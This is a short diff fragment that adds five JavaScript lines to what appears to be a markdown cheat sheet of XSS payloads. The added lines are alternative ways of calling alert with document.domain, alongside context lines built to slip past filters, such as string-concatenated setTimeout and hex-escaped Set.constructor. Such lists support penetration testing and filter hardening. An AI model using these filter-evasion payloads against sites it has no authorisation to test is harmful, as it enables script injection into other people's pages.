@@ -180,6 +180,17 @@ setTimeout('ale'+'rt(2)');
 setInterval('ale'+'rt(10)');
 Set.constructor('ale'+'rt(13)')();
 Set.constructor`al\x65rt\x2814\x29```;
+
+alert.call(null, document.domain);
+[document.domain].forEach(alert);
+alert.apply(null, [document.domain]);
+alert.bind()(document.domain);
+alert(this['document']['domain']);
+
+
+
+
+
 ```
 
 
